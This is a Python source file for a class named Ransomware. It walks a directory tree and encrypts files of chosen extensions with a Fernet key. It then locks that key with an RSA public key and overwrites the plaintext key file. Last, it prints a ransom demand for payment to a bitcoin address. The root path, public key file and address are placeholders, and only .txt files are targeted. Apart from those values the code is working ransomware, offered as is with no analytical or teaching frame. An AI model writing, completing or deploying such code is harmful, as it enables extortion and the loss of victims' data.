import os
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

class Ransomware:
    def __init__(self):
        self.local_root = "<your_root_path>"
        self.key = None
        self.crypter = None
        self.public_key = None
        self.file_exts = ['txt',]
        pass
    
    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)
        print("Key generated")
    
    def write_key(self):
        with open("fkey.txt", "wb") as file:
            file.write(self.key)
    
    def encrypt_f_key(self):
        with open("fkey.txt", "rb") as file:
            fkey = file.read()
        
        with open("fkey.txt", "wb") as file:
            self.public_key = RSA.importKey(open("<your_public_key.pem>").read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            enc_key = public_crypter.encrypt(fkey)
            file.write(enc_key)
        
        self.key = enc_key
        self.crypter = None
    
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, "rb") as file:
            _data = file.read()
            if not encrypted:
                print("Encrypting " + file_path)
                _data = self.crypter.encrypt(_data)
            else:
                print("Decrypting  " + file_path)
                _data = self.crypter.decrypt(_data)
        
        with open(file_path, "wb") as file:
            file.write(_data)

    def crypt_system(self, encrypted=False):
        systemRoot = os.walk(self.local_root, topdown=True)
        for root, dirs, files in systemRoot:
            for file in files:
                file_path = os.path.join(root, file) 
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

def main():
    rw = Ransomware()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_f_key()

    print("System is locked! If you wish to get your files back you must pay {0}$ to this bitcoin address {1}".format("200", "abcdefg123"))

if __name__ == "__main__":
    main()